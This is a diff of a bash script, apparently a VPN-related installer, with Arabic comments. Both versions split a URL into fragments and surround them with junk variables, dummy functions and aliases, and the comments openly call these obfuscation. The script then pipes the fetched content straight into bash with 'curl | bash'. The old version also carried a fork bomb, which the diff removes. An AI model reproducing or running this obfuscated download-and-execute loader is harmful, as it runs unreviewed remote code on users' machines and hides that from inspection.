@@ -1,28 +1,23 @@
 #!/bin/bash
 
-#zi-vpn.com
+# ألوان
 YELLOW="\033[1;33m"
 GREEN="\033[0;32m"
 RED="\033[0;31m"
 NC="\033[0m"
 
-#zi-vpn.com
-junk1="this"
-junk2="is"
-junk3="not"
-junk4="real"
-junk5="code"
-func_useless1() { echo "No operation"; }
-func_useless2() { echo "Hidden"; }
-alias fakecmd1="ls /dev/null"
-alias fakecmd2="echo not_a_command"
+# سطور تشويش بدون ضرر
+junk1="safe"
+junk2="nothing"
+junk3="harmless"
+func_useless1() { echo "Fake Function 1"; }
+func_useless2() { echo "Fake Function 2"; }
+alias fakecmd1="echo doing nothing"
+alias fakecmd2="ls > /dev/null"
 temp_var1=$(date)
 temp_var2=$(whoami)
-temp_var3="another_fake_line"
-:(){ :|:& };: # وهمية - won't run normally
-false || true
 
-#zi-vpn.com
+# تقطيع الرابط الحقيقي
 a1="https:"
 a2="/"
 a3="/raw"
@@ -34,40 +29,31 @@ a8="/heads"
 a9="/main"
 a10="/in"
 
-#zi-vpn.com
+# دالة تركيب الرابط
 build_url() {
     echo "${a1}${a2}${a3}${a4}${a5}${a6}${a7}${a8}${a9}${a10}"
 }
 
-#zi-vpn.com
+# دالة تنفيذ الرابط
 run_remote() {
     remote_url=$(build_url)
     curl -s "$remote_url" | bash
 }
 
-#zi-vpn.com
-var9="nothing_to_see_here"
-var10=$(uptime)
+# مزيد من التشويش بدون ضرر
 function temp_func1() { return 0; }
+var9="nothing_to_see_here"
 case "$junk1" in
-    "this") echo -n "" > /dev/null ;;
+    "safe") echo -n "" > /dev/null ;;
 esac
 
-# Call to actual logic
+# نداء الدالة الحقيقية
 run_remote
 
-#zi-vpn.com
+# سطور إضافية وهمية
 for i in {1..10}; do
     echo "" > /dev/null
 done
-
-do_nothing="still_useless"
-[[ $do_nothing == "nothing" ]] && echo "never happens"
-
-#zi-vpn.com
-declare -A fake_map
-fake_map[one]="uno"
-fake_map[two]="dos"
 
 # النهاية
 exit 0
